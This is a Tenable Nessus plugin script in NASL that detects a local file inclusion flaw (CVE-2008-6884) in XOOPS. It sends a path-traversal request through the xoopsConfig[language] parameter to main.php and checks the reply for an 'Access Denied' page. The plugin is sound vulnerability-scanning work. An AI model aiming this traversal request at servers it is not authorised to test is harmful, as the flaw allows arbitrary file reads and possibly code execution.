#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35278);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2008-6884");
  script_bugtraq_id(32685);
  script_osvdb_id(50573);

  script_name(english:"XOOPS xoopsConfig[language] Parameter Local File Inclusion (DSECRG-08-040)");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack." );
 script_set_attribute(attribute:"description", value:
"The version of XOOPS installed on the remote host fails to filter
user-supplied input to the 'xoopsConfig[language]' parameter before
passing it to a PHP 'include_once()' function in
'xoops_lib/modules/protector/main.php'.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files or possibly to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

Note that this install is also likely affected by a similar local file
include vulnerability as well as a cross-site scripting issue,
although Nessus has not checked for them." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/499002/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.xoops.org/modules/news/article.php?storyid=4563" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to XOOPS version 2.3.2b or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/12/29");
 script_cvs_date("$Date: 2016/05/04 18:02:24 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:xoops:xoops");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read a file.
  #
  # nb: this tries to retrieve 'modules/system/admin/users/main.php',
  #     which should die with an 'Access Denied' error message.
  traversal = "../../../../modules/system/admin/users";
  url = string(
    dir, "/xoops_lib/modules/protector/main.php?",
    "mydirpath=", SCRIPT_NAME, "&",
    "xoopsConfig[language]=", traversal
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) exit(0);

  # There's a problem if...
  if ("Access Denied" >< res[2])
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue exists using the following \n",
        "request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
}
